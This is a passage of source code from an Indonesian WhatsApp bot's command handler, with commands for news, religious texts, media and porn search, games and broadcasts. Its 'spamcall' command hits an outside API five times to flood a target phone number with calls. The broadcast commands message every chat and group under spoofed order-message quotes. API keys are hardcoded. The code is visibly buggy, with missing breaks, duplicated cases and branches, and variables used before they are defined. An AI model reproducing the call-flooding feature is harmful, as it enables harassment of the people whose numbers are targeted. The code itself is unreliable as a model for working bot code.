teks = `${anu.result}`
itsmevall.sendMessage(from, teks, text, {quoted: mek})
break
case 'bc2':
case 'Bc2':

itsmevall.updatePresence(from, Presence.composing)

					if (!isOwner && !mek.key.fromMe) return reply(mess.only)

					if (args.length < 1) return reply('Teksnya?')

					anu = await itsmevall.chats.all()

					if (isMedia && !mek.message.videoMessage || isQuotedImage) {

						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await itsmevall.downloadMediaMessage(encmedia)

						for (let _ of anu) {

							itsmevall.sendMessage(_.jid, buff, image, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fs.readFileSync('./stik/thumb.jpeg'), surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: `*BROADCAST BOT*\n\n${body.slice(4)}` })

						}

						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)

						} else if (isMedia && !mek.message.videoMessage || isQuotedVideo) {

						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await itsmevall.downloadMediaMessage(encmedia)

						for (let _ of anu) {

							itsmevall.sendMessage(_.jid, buff, video, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fs.readFileSync('./stik/thumb.jpeg'), surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: `*BROADCAST BOT*\n\n${body.slice(4)}` })

						}

						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)

						} else if (isMedia && !mek.message.videoMessage || isQuotedVideo) {

						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await itsmevall.downloadMediaMessage(encmedia)

						for (let _ of anu) {

							itsmevall.sendMessage(_.jid, buff, video, { mimetype: Mimetype.gif, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fs.readFileSync('./stik/thumb.jpeg'), surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: `*BROADCAST BOT*\n\n${body.slice(4)}` })

						}

						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)

					} else {

						for (let _ of anu) {

							sendMess(_.jid, `${body.slice(4)}`)

						}

						reply(`Sukses mengirim Broadcast:\n${body.slice(4)}`)

					}

					break
        case 'del':
		        case 'd':
		        case 'delete':             
case 'Del':
		        case 'D':
		        case 'Delete':                
				itsmevall.deleteMessage(from, { id: mek.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
				break
case 'mediafire':
case 'Mediafire':
if (args.length < 1) return reply('Link Nya Mana? ')
if(!isUrl(args[0]) && !args[0].includes('mediafire')) return reply(mess.error.api)
if (Number(filesize) >= 30000) return reply(`*Nama :* ${res[0].nama}
*Ukuran :* ${res[0].size}
*Link :* ${res[0].link}

_Maaf size melebihi batas maksimal, Silahkan klik link diatas_`)
reply(mess.wait)
teks = args.join(' ')
res = await mediafireDl(teks)
result = `*Nama :* ${res[0].nama}
*Ukuran :* ${res[0].size}

_File sedang dikirim, Silahkan tunggu beberapa menit_`
reply(result)
sendFileFromUrl(res[0].link, document, {mimetype: res[0].mime, filename: res[0].nama, quoted: mek})
break
case 'herolist':
case 'Herolist':
await herolist().then((ress) => {
let listt = `*List hero untuk feature ${prefix}herodetail*\n\n`
for (var i = 0; i < ress.hero.length; i++) {
listt += '-  ' + ress.hero[i] + '\n'
}
reply(listt)
})
break
case 'herodetail':
case 'Herodetail':
res = await herodetails(body.slice(12))
her = `*Hero Details ${body.slice(12)}*

*Nama* : ${res.hero_name}
*Role* : ${res.role}
*Quotes* : ${res.entrance_quotes}
*Fitur Hero* : ${res.hero_feature}
*Spesial* : ${res.speciality}
*Rekomendasi Lane* : ${res.laning_recommendation}
*Hitsmeval* : ${res.price.battle_point} [Battle point] | ${res.price.diamond} [DM] | ${res.price.hero_fragment} [Fragment]
*Rilis* : ${res.release_date}

*Durability* : ${res.skill.durability}
*Offence* : ${res.skill.offense}
*Skill Effect* : ${res.skill_effects}
*Difficulty* : ${res.skill.difficulty}
 
*Movement Speed* : ${res.attributes.movement_speed}
*Physical Attack* : ${res.attributes.physical_attack}
*Magic Defense* : ${res.attributes.magic_defense}
*Ability Crit Rate* : ${res.attributes.ability_crit_rate}
*HP* : ${res.attributes.hp}
*Mana* : ${res.attributes.mana}
*Mana Regen* : ${res.attributes.mana_regen}

*Story* : ${res.background_story}`
reply(her)
break
case 'meme':
case 'Meme':
reply(mess.wait)
anu = await fetchJson(`https://api-yuzzu.herokuapp.com/api/darkjokes?apikey=Yuzzu`)
buff = await getBuffer(anu.result.result)
gbutsan = [{buttonId:`meme`,buttonText:{displayText:'LANJUTโก๏ธ'},type:1}]
mhan = await itsmevall.prepareMessage(from, buff, image, {thumbnail: buff})
const buttonMessagessss = {
imageMessage: mhan.message.imageMessage,
contentText: `Ngedark Bos`,
footerText: '*_ยฉKatashi Hana_*',
buttons: gbutsan,
headerType: 4
}
itsmevall.sendMessage(from, buttonMessagessss, MessageType.buttonsMessage, {
        thumbnail: fs.readFileSync('./itsmevall.jpg'),
        caption: 'Tes',
            quoted: mek})
            case 'bisakah':
            case 'Bisakah':
					bisakah = body.slice(1)
					const bisa =['Bisa','Tidak Bisa','Coba Ulangi','Ngimpi kah?','yakin bisa?']
					const keh = bisa[Math.floor(Math.random() * bisa.length)]
					itsmevall.sendMessage(from, 'Pertanyaan : *'+bisakah+'*\n\nJawaban : '+ keh, text, { quoted: mek })
					break
				case 'kapankah':
				case 'Kapankah':
					kapankah = body.slice(1)
					const kapan =['Besok','Lusa','Tadi','4 Hari Lagi','5 Hari Lagi','6 Hari Lagi','1 Minggu Lagi','2 Minggu Lagi','3 Minggu Lagi','1 Bulan Lagi','2 Bulan Lagi','3 Bulan Lagi','4 Bulan Lagi','5 Bulan Lagi','6 Bulan Lagi','1 Tahun Lagi','2 Tahun Lagi','3 Tahun Lagi','4 Tahun Lagi','5 Tahun Lagi','6 Tahun Lagi','1 Abad lagi','3 Hari Lagi','Tidak Akan Pernah']
					const koh = kapan[Math.floor(Math.random() * kapan.length)]
					itsmevall.sendMessage(from, 'Pertanyaan : *'+kapankah+'*\n\nJawaban : '+ koh, text, { quoted: mek })
					break
         			  case 'apakah':
         case 'Apakah':
					apakah = body.slice(1)
					const apa =['Iya','Tidak','Bisa Jadi','Coba Ulangi','Tanyakan Ayam']
					const kah = apa[Math.floor(Math.random() * apa.length)]
					itsmevall.sendMessage(from, 'Pertanyaan : *'+apakah+'*\n\nJawaban : '+ kah, text, { quoted: mek })
					break
				case 'rate':
				case 'Rate':
					rate = body.slice(1)
					const ra =['4','9','17','28','34','48','59','62','74','83','97','100','29','94','75','82','41','39']
					const te = ra[Math.floor(Math.random() * ra.length)]
					itsmevall.sendMessage(from, 'Pertanyaan : *'+rate+'*\n\nJawaban : '+ te+'%', text, { quoted: mek })
					break
case 'listdaerah': //By itsmeval
case 'Listdaerah':
anu = await fetchJson(`https://api.zeks.xyz/api/jadwalsholat?apikey=apivinz&daerah=malang`, {method: 'get'})
teks = `${anu.listdaerah}`
itsmevall.sendMessage(from, teks, text, {quoted: mek})
break
case 'randomquran':
case 'Randomquran':
            res = await axios.get(`https://api.zeks.me/api/randomquran?apikey=CpGSLymOQy9KfTKgQZr9eDSYqqR`)
            rquran = res.data.result
            teks = `*Surah* : ${rquran.nama}\n*Arti* : ${rquran.arti}\n*Ayat* : ${rquran.asma}\n*Keterangan* : ${rquran.keterangan}`
            reply(teks)
            itsmevall.sendFileFromUrl(from, rquran.audio, 'quran.mp3', ``, message)
        break
case 'googlesearch2':
case 'Googlesearch2':
case 'ggs2':
case 'Ggs2':
if (args.length == 0) return reply(`Example: ${prefix + command} katashi hana`)
                    query = args.join(" ")
         reply(mess.wait)
anu = await fetchJson(`https://itsmevall-api.herokuapp.com/google?q=${query}`)
		   for (let co of anu.result) {
					  teks += `
\nTITLE : ${co.title}\nSNIPPET : ${co.snippet}
\nLINK : ${co.link}\n`
				   }
				   reply(teks)
				break
case 'style':
case 'Style':
				  if (args.length == 0) return reply(`Example: ${prefix + command} katashi hana`)
                    query = args.join(" ")
         reply(mess.wait)
			axios.get(`https://kocakz.herokuapp.com/api/random/text/fancytext?text=${query}`).then((res) => {
      let hasil = `*Hasil* :\n${res.data.result}`;
      itsmevall.sendMessage(from, hasil, MessageType.text, { quoted: mek});
    })
			break
case 'pastebin':
case 'Pastebin':
if (args.length == 0) return reply(`Example: ${prefix + command} katashi hana`)
                    query = args.join(" ")
anu = await fetchJson(`https://api-anoncybfakeplayer.herokuapp.com/pastebin?text=${query}`, {method: 'get'})
                   itsmevall.sendMessage(from, `${anu.result}`, text, {quoted: ftroli})
                     break
case 'doaharian':
case 'Doaharian':
anu = await fetchJson(`https://xdev-api.herokuapp.com/muslim/doaharian`)
				   teks = `*โช* *DOA HARIAN*\n\n`
				   for (let ei of anu.result.data) {
					  teks += `*${ei.title}*\n*Arab:* ${ei.arabic}\n*Latin:* ${ei.latin}\n*Terjemah:* ${ei.translation}\n=============================\n`
				   }
				   reply(teks)
            break

case 'ayatkursi':
case 'Ayatkursi':
anu = await fetchJson(`https://xdev-api.herokuapp.com/muslim/ayatkursi`)
				    oi = anu.result.data
					teks = `*โช* *AYAT KURSI*\n\n*Arab:* ${oi.arabic}\n*Latin:* ${oi.latin}\n*Terjemah:* ${oi.translation}`
				   reply(teks)
             break

case 'bacaanshalat':
case 'Bacaanshalat':
anu = await fetchJson(`https://xdev-api.herokuapp.com/muslim/bacaanshalat`)
				   teks = `*โโ* *BACAAN SHALAT*\n\n`
				   for (let ui of anu.result) {
					  teks += `*${ui.name}*\n*Arab:* ${ui.arabic}\n*Latin:* ${ui.latin}\n*Terjemah:* ${ui.terjemahan}\n=============================\n`
				   }
				   reply(teks)
             break
             case 'hadist':
             case 'Hadist':
             if (!q) return reply(`contoh ${prefix}hadist bukhari|52`)
var teks = body.slice(8)
                       t1 = teks.split('|')[0]
                       t2 = teks.split('|')[1]
get_result = await fetchJson(`https://xdev-api.herokuapp.com/hadits?kitab=${t1}&nomor=${t2}`)
                    get_result = get_result.result
                    ini_txt = `Judul : ${get_result.message}\n`
                    ini_txt += `Nama : ${get_result.data.name}\n`
                    ini_txt += `id : ${get_result.data.id}\n`
                    ini_txt += `Available : ${get_result.data.available}`
ini_txt += `Nomor : ${get_result.data.contents.number}\n`
ini_txt += `Arab : ${get_result.data.contents.arab}\n`
ini_txt += `Latin : ${get_result.data.contents.id}`
                    reply(ini_txt)
break
case 'ytplaylist':
case 'Ytplaylist':
                        if (args.length == 0) return reply(`Example: ${prefix + command} katashi hana`)
                    query = args.join(" ")
                        reply(mess.wait)
                        res = await axios.get(`https://api.zeks.me/api/ytplaylist?apikey=CpGSLymOQy9KfTKgQZr9eDSYqqR&q=${query}`)
                        ttt = res.data.result
                        var teks = `*ใ YOUTUBE PLAYLIST ใ*\n\n*Hasil Pencarian : ${body}*\n\n`
                        for(let i = 0; i < ttt.length; i++) {
                            teks += `*Nama* : ${ttt[i].title}\n*Jumlah video*: ${ttt[i].video_count}\n*Channel*: ${ttt[i].uploader.username}\n*Link*: ${ttt[i].url}\n\n`
                        }
                        reply(teks)
case 'bcgrup':
case 'Bcgrup':
                    if (!isOwner) return
                    const allGrouppz = await itsmevall.getAllGroups()
                    for (let gclistt of allGrouppz) {
                        await itsmevall.sendText(gclistt.contact.id, `${q}`)
                    }
                    itsmevall.reply(from, 'Succes Bc all group!', id)
                    break
                        case 'katailham':  
                        case 'Katailham':  
                     const kta =['Lebih baik mengerti sedikit daripada salah mengerti.',
'Hampir semua pria memang mampu bertahan menghadapi kesulitan. Namun, jika Anda ingin menguji karakter sejati pria, beri dia kekuasaan.',
'Bila tekad seseorang kuat dan teguh, Tuhan akan bergabung dalam usahanya.',
'Penderitaan adalah pelajaran.',
'Ilmu pengetahuan tanpa agama adalah pincang.',
'Hidup itu seperti sebuah sepeda, agar tetap seimbang kita harus tetap bergerak.',
'Perbedaan masa lalu, sekarang, dan masa depan tak lebih dari ilusi yang keras kepala.',
'Sebuah meja, sebuah kursi, semangkuk buah, dan sebuah biola; apa lagi yang dibutuhkan agar seseorang bisa merasa bahagia?',
'Belas kasihanlah terhadap sesama, bersikap keraslah terhadap diri sendiri.',
'Cara paling baik untuk menggerakkan diri Anda ialah memberi tugas kepada diri sendiri.',
'Kita tidak boleh kehilangan semangat. Semangat adalah stimulan terkuat untuk mencintai, berkreasi dan berkeinginan untuk hidup lebih lama.',
'Manusia akan bahagia selama ia memilih untuk bahagia.','Saya tidak berharap menjadi segalanya bagi setiap orang. Saya hanya ingin menjadi sesuatu untuk seseorang.',
'Apabila sempurna akal seseorang, maka sedikit perkataannya.','Bahagialah orang yang dapat menjadi tuan untuk dirinya, menjadi kusir untuk nafsunya dan menjadi kapten untuk bahtera hidupnya.',
'Sahabat yang jujur lebih besar harganya daripada harta benda yang diwarisi dari nenek moyang.','Yang paling melelahkan dalam hidup adalah menjadi orang yang tidak tulus.',
'Terbuka untuk Anda, begitulah Tuhan memberi kita jalan untuk berusaha. Jangan pernah berfikir jalan sudah tertutup.',
'Penundaan adalah kuburan dimana peluang dikuburkan.','Cinta bukan saling menatap mata, namun melihat ke arah yang sama bersama-sama.',
'Kita adalah apa yang kita kerjakan berulang kali. Dengan demikian, kecemerlangan bukan tindakan, tetapi kebiasaan.',
'Jangan pernah mencoba menjadikan putra atau putri Anda menjadi seperti Anda. Diri Anda hanya cukup satu saja.',
'Jika Anda bisa membuat orang lain tertawa, maka Anda akan mendapatkan semua cinta yang Anda inginkan.',
'Masalah akan datang cepat atau lambat. Jika masalah datang, sambut dengan sebaik mungkin. Semakin ramah Anda menyapanya, semakin cepat ia pergi.',
'Kita tak bisa melakukan apapun untuk mengubah masa lalu. Tapi apapun yang kita lakukan bisa mengubah masa depan.',
'Kesabaran adalah teman dari kebijaksanaan.','Orang-orang kreatif termotivasi oleh keinginan untuk maju, bukan oleh keinginan untuk mengalahkan orang lain.',
'Dimanapun engkau berada selalulah menjadi yang terbaik dan berikan yang terbaik dari yang bisa kita berikan.',
'Kebencian seperti halnya cinta, berkobar karena hal-hal kecil.',
'Anda tidak perlu harus berhasil pada kali pertama.',
'Satu jam yang intensif, jauh lebih baik dan menguntungkan daripada bertahun-tahun bermimpi dan merenung-renung.',
'Hal terbaik yang bisa Anda lakukan untuk orang lain bukanlah membagikan kekayaan Anda, tetapi membantu dia untuk memiliki kekayaannya sendiri.',
'Tidak ada jaminan keberhasilan, tetapi tidak berusaha adalah jaminan kegagalan.',
'Aku tidak tahu kunci sukses itu apa, tapi kunci menuju kegagalan adalah mencoba membuat semua orang senang.']
					const su = kta[Math.floor(Math.random() * kta.length)]
					itsmevall.sendMessage(from, ''+su+'\n\n_-Ilham._', text, { quoted: mek })
					break
case 'ingfo':  
case 'Ingfo':  
				    if (!isGroup) return reply(`GRUP ONLY`)
					if (!isGroupAdmins) return reply(`LU ADMIN??`)
					var value = body.slice(7)
					var group = await itsmevall.groupMetadata(from)
					var member = group['participants']
					var mem = []
					member.map( async adm => {
					mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
					})
					var options = {
					text: `[ *INGFO TERBARU!!!* ]\nDARI : *${pushname}*\nINGFO : *${value}*`,
					contextInfo: { mentionedJid: mem },
					quoted: mek
					}
					itsmevall.sendMessage(from, options, text, {quoted: mek})					 
					break
                        case 'film':
                        case 'Film':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Doraemon`)
                    query = args.join(" ")
                        reply(mess.wait)
                        res = await axios.get(`https://api.zeks.me/api/film?apikey=CpGSLymOQy9KfTKgQZr9eDSYqqR&q=${query}`)
                        ttt = res.data.result
                        var teks = `*ใ FILM ใ*\n\n*Hasil Pencarian : ${query}*\n\n`
                        for(let i = 0; i < ttt.length; i++) {
                            teks += `*Title* : ${ttt[i].title}\n*Link*: ${ttt[i].url}\n\n`
                        }
                        reply(teks)
                    break
                case 'happymod':
                case 'Happymod':
                    if (args.length == 0) return reply(`Example: ${prefix + command} pubg`)
                    query = args.join(" ")
                        reply(mess.wait)
                        res = await axios.get(`https://api.zeks.me/api/happymod?apikey=CpGSLymOQy9KfTKgQZr9eDSYqqR&q=${query}`)
                        ttt = res.data.result
                        var teks = `*ใ HAPPYMOD ใ*\n\n*Hasil Pencarian : ${query}*\n\n`
                        for(let i = 0; i < ttt.length; i++) {
                            teks += `*Title* : ${ttt[i].title}\n*Rate*: ${ttt[i].rating}\n*Link*: ${ttt[i].url}\n\n`
                        }
                        reply(teks)
                    break
                case 'ytchannel':
                case 'Ytchannel':
                        if (args.length == 0) return reply(`Example: ${prefix + command} katashi hana`)
                    query = args.join(" ")
                        reply(mess.wait)
                        res = await axios.get(`https://api.zeks.me/api/ytchannel?apikey=CpGSLymOQy9KfTKgQZr9eDSYqqR&q=${query}`)
                        ttt = res.data.result
                        var eks = `*ใ YOUTUBE CHANNEL ใ*\n\n*Hasil Pencarian : ${body}*\n\n`
                        for(let i = 0; i < ttt.length; i++) {
                            eks += `*Nama* : ${ttt[i].title}\n*Deskripsi*: ${ttt[i].description}\n*Verified* : ${ttt[i].verified}\n*Jumlah video*: ${ttt[i].video_count}\n*Subcriber*: ${ttt[i].subscriber_count}\n*Link*: ${ttt[i].url}\n\n`
                        }
                        reply(eks)
                    break
case 'mostviewfilm':
case 'Mostviewfilm':
					anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/mostviewfilm`, {method: 'get'})
					teks = 'MOSTVIEWFILM\n'
					for (let i of anu.result) {
						teks += `*Penonton:* : ${i.penonton}\n*Rank* : ${i.rank}\n*Url* : ${i.link}\n\n*MOSTVIEWFILM*\n`
					}
					reply(teks.trim())  
					
					break
case 'trendingtwitter':
case 'Trendingtwitter':
					anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/trendingtwitter`, {method: 'get'})
					teks = 'TRENDING TWITER\n'
					for (let i of anu.result) {
						teks += `*Hastag:* : ${i.hastag}\n*Rank* : ${i.rank}\n*Url* : ${i.link}\n*Tweet* : ${i.tweet}\n\n*TRANDING TWITTER*\n`
					}
					reply(teks.trim())  
					
					break
case 'tribunnews': // Update By KATASHI
case 'Tribunnews': // Update By KATASHI
					data = await fetchJson(`https://api.zeks.xyz/api/tribunews?apikey=apivinz`, {method: 'get'})
					teks = '๐ง๐ฟ๐ถ๐ฏ๐๐ป ๐ป๐ฒ๐๐\n'
					for (let i of data.result) {
						teks += `*Title:* : ${i.title}\n*Time* : ${i.time}\n*Url* : ${i.url}\n*Tweet* : ${i.ket}\n\n๐ง๐ฟ๐ถ๐ฏ๐๐ป ๐ป๐ฒ๐๐\n`
					}
					reply(teks.trim())
					
					break
case 'liputan': // Update By KATASHI
case 'Liputan': // Update By KATASHI
					data = await fetchJson(`https://api.zeks.xyz/api/liputan6?apikey=apivinz`, {method: 'get'})
					teks = '๐๐ถ๐ฝ๐๐๐ฎ๐ป\n'
					for (let i of data.result) {
						teks += `*Title:* : ${i.title}\n*Url* : ${i.url}\n*Keterangan* : ${i.ket}\n*Category* : ${i.category}\n*Time* : ${i.time}\n\n๐๐ถ๐ฝ๐๐๐ฎ๐ป\n`
					}
					reply(teks.trim())
					
					break
case 'spamcall':
case 'Spamcall':
                    if (!isOwner && !mek.key.fromMe) return reply(mess.only)
                    if (args.length == 0) return reply(`Example: ${prefix + command} 8303030303030`)
                    nomor = args[0]
                    await fetchJson(`http://zekais-api.herokuapp.com/spamcall?no=${nomor}&apikey=vZ7wFVI3`)
                    await fetchJson(`http://zekais-api.herokuapp.com/spamcall?no=${nomor}&apikey=vZ7wFVI3`)
                    await fetchJson(`http://zekais-api.herokuapp.com/spamcall?no=${nomor}&apikey=vZ7wFVI3`)
                    await fetchJson(`http://zekais-api.herokuapp.com/spamcall?no=${nomor}&apikey=vZ7wFVI3`)
                    await fetchJson(`http://zekais-api.herokuapp.com/spamcall?no=${nomor}&apikey=vZ7wFVI3`)
                    reply("Success")
                    break        
case 'palingmurah': // Update By KATASHI
case 'Palingmurah': // Update By KATASHI
if (args.length == 0) return reply(`Example: ${prefix + command} pubg`)
                    query = args.join(" ")
					data = await fetchJson(`https://dapuhy-api.herokuapp.com/api/search/palingmurah?query=${query}&apikey=RSWX4evmQEmItxR`, {method: 'get'})
					teks = 'PALING MURAH\n'
					for (let i of data.result) {
						teks += `*Title:* : ${i.title}\n*Url* : ${i.url}\n*Keterangan* : ${i.desc}\n*Price* : ${i.price}\n\nPalingmurah\n`
					}
					reply(teks.trim())
					
					break
case 'sfilesearch': // Update By KATASHI
case 'Sfilesarch': // Update By KATASHI
case 'ssearch': // Update By KATASHI
case 'Ssearch': // Update By KATASHI
if (args.length == 0) return reply(`Example: ${prefix + command} pubg`)
                    query = args.join(" ")
					data = await fetchJson(`https://dapuhy-api.herokuapp.com/api/search/sfile?query=${query}&apikey=RSWX4evmQEmItxR`, {method: 'get'})
					teks = 'SFILE SEARCH\n'
					for (let i of data.result) {
						teks += `*Title:* : ${i.title}\n*Url* : ${i.url}\n*IMAGE* : ${i.thumb}\n\nSFILE SEARCH\n`
					}
					reply(teks.trim())
					
					break
case 'Ph': // Update By KATASHI
case 'ph': // Update By KATASHI
case 'phsearch': // Update By KATASHI
case 'Phsearch': // Update By KATASHI
if (args.length == 0) return reply(`Example: ${prefix + command} milf`)
                    query = args.join(" ")
					data = await fetchJson(`https://bx-hunter.herokuapp.com/api/pornhubscraper?query=japan&apikey=Ikyy69`, {method: 'get'})
					teks = 'PORNHUB SEARCH\n'
					for (let i of data.result) {
						teks += `*Title:* : ${i.title}\n*Url* : ${i.link}\n*Author* : ${i.author}\nHd* : ${i.hd}\n*Premium* : ${x.premium}\n*Views* : ${x.views}\n\nPORNHUB SEARCH\n`
					}
					reply(teks.trim())
					
					break
case 'Tokohindo': // Update By KATASHI
case 'tokohindo': // Update By KATASHI
					data = await fetchJson(`https://dapuhy-api.herokuapp.com/api/others/tokohindo?apikey=RSWX4evmQEmItxR`, {method: 'get'})
					teks = 'TOKOH INDO\n'
					for (let x of data.result) {
						teks += `*Nama:* : ${x.nama}\n*Asal* : ${x.asal}\n*Nama Asli* : ${x.nama2}\n*Asal* : ${x.asal}\n*Lahir* : ${x.lahir}\n*Gugur* : ${x.gugur}\n*Usia* : ${x.usia}\n*Lokasi Makam* : ${x.lokasimakam}\n*History* : ${x.history}\n\nTOKOH INDO\n`
					}
					reply(teks.trim())
					
					break
case 'infoloker': // Update By KATASHI
case 'Infoloker': // Update By KATASHI
					data = await fetchJson(`https://docs-jojo.herokuapp.com/api/infoloker`, {method: 'get'})
					teks = 'INFO LOKER\n'
					for (let x of data.result) {
						teks += `*Perusahaan:* : ${x.perusahaan}\n*Url* : ${x.link}\n*Profesi* : ${x.profesi}\n*Gaji* : ${x.gaji}\n*Lokasi* : ${x.lokasi}\n*Pengalaman* : ${x.pengalaman}\n*Edukasi* : ${x.edukasi}\n*Description* : ${x.desc}\n*Syarat* : ${x.syarat}\n\nINFO LOKER\n`
					}
					reply(teks.trim())
					
					break
case 'kompastv': // Update By KATASHI
case 'Kompastv': // Update By KATASHI
					data = await fetchJson(`https://dapuhy-api.herokuapp.com/api/berita/kompas?apikey=RSWX4evmQEmItxR`, {method: 'get'})
					teks = 'KOMPAS TV\n'
					for (let x of data.result) {
						teks += `*Title:* : ${x.title}\n*Link* : ${x.url}\n*Jenis* : ${x.jenis}\n*Upload* : ${x.upload}\n\nKOMPAS TV\n`
					}
					reply(teks.trim())
					
					break
case 'animeindo': // Update By KATASHI
case 'Animeindo': // Update By KATASHI
if (args.length == 0) return reply(`Example: ${prefix + command} pubg`)
                    query = args.join(" ")
					data = await fetchJson(`https://dapuhy-api.herokuapp.com/api/anime/animeindo?query=${query}&apikey=RSWX4evmQEmItxR`, {method: 'get'})
					teks = 'ANIMEiNDO\n'
					for (let x of data.result) {
						teks += `*Title:* : ${x.title}\n*Url* : ${x.url}\n*Image* : ${x.thumb}\n*Durasi* : ${x.duration}\n*Release* : ${x.release}\n*Description* : ${x.desc}\n\nANIMEINDO\n`
					}
					reply(teks.trim())
					
					break
case 'Jav': // Update By KATASHI
case 'jav': // Update By KATASHI
case 'JAV': // Update By KATASHI
if (args.length == 0) return reply(`Example: ${prefix + command} milf`)
                    query = args.join(" ")
					data = await fetchJson(`https://dapuhy-api.herokuapp.com/api/search/javhdporn?query=${query}&apikey=RSWX4evmQEmItxR`, {method: 'get'})
					teks = 'JAV PORN\n'
					for (let x of data.result) {
						teks += `*Title:* : ${x.title}\n*Url* : ${x.url}\n*Image* : ${x.thumb}\n*Durasi* : ${x.duration}\n*Viewers* : ${x.viewers}\n*Quality* : ${x.quality}\n\nJAV PORN\n`
					}
					reply(teks.trim())
					
					break
case 'corona': // Update By KATASHI
case 'Corona': // Update By KATASHI
					data = await fetchJson(`https://hardianto-chan.herokuapp.com/api/info/covidindo?apikey=hardianto`, {method: 'get'})
					teks = 'CORONA INDO\n'
					for (let x of data.result) {
						teks += `*Fid:* : ${x.attributes.FID}\n*Kode Provinsi* : ${x.attributes.Kode_Provi}\n*Provinsi* : ${x.attributes.Provinsi}\n*Sembuh* : ${x.attributes.Kasus_Semb}\n*Positive* : ${x.attributes.Kasus_Posi}\n*Meninggal* : ${x.attributes.Kasus_Meni}\n\nCORONA INDO\n`
					}
					reply(teks.trim())
					
					break
case 'Kodepos2': // Update By KATASHI
case 'kodepos2': // Update By KATASHI
if (args.length == 0) return reply(`Example: ${prefix + command} bekasi`)
                    query = args.join(" ")
					data = await fetchJson(`https://hardianto-chan.herokuapp.com/api/info/kodepos?kota=${query}&apikey=hardianto`, {method: 'get'})
					teks = 'INFO KODE POS\n'
					for (let x of data.result.data) {
						teks += `*Province:* : ${x.province}\n*Kecamatan* : ${x.subdistrict}\n*Perkotaan* : ${x.urban}\n*Kode* : ${x.postalcode}\n\nINFO KODE POS\n`
					}
					reply(teks.trim())
					
					break
case 'cnn': // Update By KATASHI
case 'Cnn': // Update By KATASHI
					data = await fetchJson(`https://dapuhy-api.herokuapp.com/api/berita/cnn?apikey=RSWX4evmQEmItxR`, {method: 'get'})
					teks = 'CNN NEWS\n'
					for (let i of data.result) {
						teks += `*Title:* : ${i.title}\n*Link:* ${i.url}*Upload:* ${i.upload}\n\nCNN NEWS\n`
					}
					reply(teks.trim())
					
					break
case 'wirid': // Update By KATASHI
case 'Wirid': // Update By KATASHI
					data = await fetchJson(`https://dapuhy-api.herokuapp.com/api/islam/wirid?apikey=RSWX4evmQEmItxR`, {method: 'get'})
					teks = 'DOA WIRID\n'
					for (let i of data.result) {
						teks += `*Id:* : ${i.id}\n*Arab:* ${i.times}*Latin:* ${i.arabic}\n\nDOA WIRID\n`
					}
					reply(teks.trim())
					
					break
case 'tahlil': // Update By KATASHI
case 'Tahlil': // Update By KATASHI
					data = await fetchJson(`https://dapuhy-api.herokuapp.com/api/islam/tahlil?apikey=RSWX4evmQEmItxR`, {method: 'get'})
					teks = 'DOA WIRID\n'
					for (let i of data.result) {
						teks += `*Id:* : ${i.id}\n*Title:* ${i.title}*Latin:* ${i.arabic}\n\nTAHLIL\n`
					}
					reply(teks.trim())
					
					break
case 'tahlil': // Update By KATASHI
case 'Tahlil': // Update By KATASHI
					data = await fetchJson(`https://dapuhy-api.herokuapp.com/api/islam/tahlil?apikey=RSWX4evmQEmItxR`, {method: 'get'})
					teks = 'DOA WIRID\n'
					for (let i of data.result) {
						teks += `*Id:* : ${i.id}\n*Title:* ${i.title}*Latin:* ${i.arabic}\n\nTAHLIL\n`
					}
					reply(teks.trim())
					
					break
case 'foxnews': // Update By KATASHI
case 'Foxnews': // Update By KATASHI
					data = await fetchJson(`https://api.zeks.xyz/api/foxnews?apikey=apivinz`, {method: 'get'})
					teks = '๐๐ผ๐ ๐ป๐ฒ๐๐\n'
					for (let i of data.result) {
						teks += `*Title:* : ${i.title}\n*Url* : ${i.url}\n*Country* : ${i.country}\n*Time* : ${i.time}\n*Content* : ${i.content}\n\n๐๐ผ๐ ๐ป๐ฒ๐๐\n`
					}
					reply(teks.trim())
					
					break
case 'alay':
case 'Alay':
					if (args.length < 1) return reply('kasih teks lah^_^!!!')
					data = await fetchJson(`https://api.zeks.xyz/api/alaymaker?kata=${body.slice(6)}&apikey=apivinz`)
					reply(data.result)
					break
case 'chord':
case 'Chord':
					     if (args.length == 0) return reply(`Example: ${prefix + command} pubg`)
                    query = args.join(" ")			
					anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/chord?q=${query}`)
					reply(anu.result)
					break
case 'katacinta':
case 'Katacinta':
					gatauda = body.slice(8)
					anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/katacinta`, {method: 'get'})
					reply(anu.result)
					break  
		case 'next':
		case 'Next':
                 if (!isRegistered) return reply( ind.noregis())
				if (isGroup) return  reply( 'Command ini tidak bisa digunakan di dalam grup!')
				anug = getRegisteredRandomId(_registered).replace('@s.whatsapp.net','')
				await reply('Find for a partner...')
				await reply(`wa.me/${anug}`)
